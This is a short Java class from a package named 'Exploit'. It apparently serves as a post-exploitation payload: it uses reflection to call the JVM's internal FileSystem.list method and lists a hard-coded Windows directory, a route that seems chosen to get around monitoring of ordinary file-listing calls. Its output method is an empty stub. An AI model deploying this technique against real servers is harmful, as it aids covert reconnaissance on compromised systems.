package top.racerz.Exploit;

import java.io.File;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Arrays;

public class DirList {
    private String result;

    public DirList() throws Exception {
        try {
            String path = "C:\\Users\\lenovo\\Desktop";
            File file = new File(path);
            if (file.isFile()) {
                file = file.getParentFile();
            }

            Class<?> clazz = Class.forName("java.io.File");
            Field field = clazz.getDeclaredField("fs");
            field.setAccessible(true);

            Class<?> fs = Class.forName("java.io.FileSystem");
            Method m = fs.getDeclaredMethod("list", File.class);
            m.setAccessible(true);
            String[] result = (String[]) m.invoke(field.get(file), file);
            this.result = Arrays.toString(result);

        } catch (Exception e) {
            this.result = "执行过程出错，动作可能执行失败";
        }

        this.echo();
    }

    public void echo() throws Exception {

    }

    public static void main(String[] args) throws Exception {
        new DirList();
    }

}
